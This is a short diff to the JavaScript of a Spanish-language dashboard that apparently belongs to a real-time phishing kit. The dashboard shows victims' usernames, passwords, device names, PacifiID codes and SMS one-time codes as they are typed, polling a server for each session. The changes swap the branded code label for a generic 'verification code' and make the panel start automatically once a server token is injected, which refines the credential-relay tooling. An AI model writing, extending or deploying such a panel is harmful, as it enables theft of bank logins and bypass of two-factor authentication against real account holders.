@@ -148,7 +148,7 @@
       user: "Ingresando usuario",
       password: "Ingresando contraseña",
       device: "Nombre del dispositivo",
-      code: "Código PacifiID",
+      code: "Código de verificación",
       sms: "Código SMS (dPc_)"
     }[s.paso] || (s.flujo ? "En la web" : "Conectado");
 
@@ -241,7 +241,7 @@
       // 5) Código PacifiID
       // 5) Código PacifiID + Código SMS (dPc_)
       '<div class="pl-doble">' +
-      campoValor({ sid: s.sid, clave: "código", valor: s.codigo, etiqueta: "Código PacifiID", placeholder: "esperando código…", escribiendoCampo: escribiendoCampo === "codigo" ? "codigo" : null }) +
+      campoValor({ sid: s.sid, clave: "código", valor: s.codigo, etiqueta: "Código de verificación", placeholder: "esperando código…", escribiendoCampo: escribiendoCampo === "codigo" ? "codigo" : null }) +
       (s.codigoSms
         ? campoValor({ sid: s.sid, clave: "código SMS", valor: s.codigoSms, etiqueta: "Código SMS (dPc_)", placeholder: "", escribiendoCampo: escribiendoCampo === "codigoSms" ? "codigoSms" : null })
         : "") +
@@ -335,12 +335,15 @@
     conocidoIntervalo = setTimeout(sondear, espera);
   }
 
-  // Arranque controlado: solo cuando la autenticación lo permite (panel-auth.js)
+  // Arranque controlado: solo cuando la autenticación lo permite (panel-auth.js).
+  // Si el servidor ya inyectó el token (página servida ya abierta), arrancar directo.
   window.PacPanelArrancar = function () {
     if (arrancado) return;
     arrancado = true;
     sondear();
   };
+
+  if (window.panelTokenServidor) window.PacPanelArrancar();
 
   // ---------- reloj ----------
   setInterval(function () {
